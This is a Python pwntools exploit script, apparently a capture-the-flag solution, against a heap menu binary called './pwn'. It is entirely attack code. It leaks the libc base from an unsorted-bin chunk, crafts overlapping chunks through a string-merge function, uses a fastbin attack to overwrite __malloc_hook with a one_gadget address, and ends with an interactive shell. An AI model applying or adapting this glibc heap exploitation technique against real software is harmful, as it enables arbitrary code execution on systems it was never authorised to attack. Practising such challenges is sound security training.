#coding=utf-8
from pwn import *
local = 1
exec_file="./pwn"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file)
if local :
    a=process(exec_file)
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("")

def debug():
    gdb.attach(a,'''
    b *(0x555555554000+0x000000000000DC4)
    b *(0x555555554000+0x000000000000F20)
    b *(0x555555554000+0x000000000000E54)
    b *(0x555555554000+0x0000000000011C1)
    ''')
def menu(idx):
    a.sendlineafter(">>> ",str(idx))
def add(size,content):
    menu(1)
    a.sendlineafter("Please enter the size of string : ",str(size))
    a.sendafter("Please enter the string : ",content)
def delete(idx):
    menu(3)
    a.sendlineafter("Please input index : ",str(idx))
def show(idx):
    menu(2)
    a.sendlineafter(" index : ",str(idx))
def merge_string(idx_1,idx_2):
    menu(4)
    a.sendlineafter("Please enter the first string index : ",str(idx_1))
    a.sendlineafter("string index : ",str(idx_2))
def merge_strings(s):
    menu(5)
    a.sendlineafter("ngs to be merged : ",s)
add(0x188,'A\n')#0
#debug()
delete(0)# string chunk  in unsorted bin 
add(0,'')#0
add(0,'')#1
show(1)
a.recvuntil("are : ")
libc_base=u64(a.recv(6).ljust(8,'\x00'))-88-libc.symbols["__malloc_hook"]-0x10
success("libc_base ==> 0x%x"%libc_base)

add(0x128-0x20-0x20,'A\n')#2 先malloc掉 unsorted bin chunk

add(0x400,'A\n')#3
add(0x68,'A\n')#4
add(0x68,'A\n')#5
add(0x18,'A\n')#6
add(0x16,'A\n')#7
delete(2)
#debug()
add(0,'')#2

add(0,'')#8
add(0,'')#9
#debug()
add(0x400,'A'*(0x400-4)+'\x21\x01\x00\x00')#10
#debug()
delete(3)
#debug()
merge_strings("8 9 10")
delete(4)
delete(5)
__malloc_hook=libc_base+libc.symbols["__malloc_hook"]
payload='A'*0x68+p64(0x21)
payload+='\x00'*(0x88-0x70)+p64(0x71)+p64(__malloc_hook-0x23)
#debug()
add(0xe0-8,payload+'\n')
add(0x68,'A\n')
one=libc_base+0xf1147
add(0x68,'A'*0x13+p64(one)+'\n')
a.interactive()









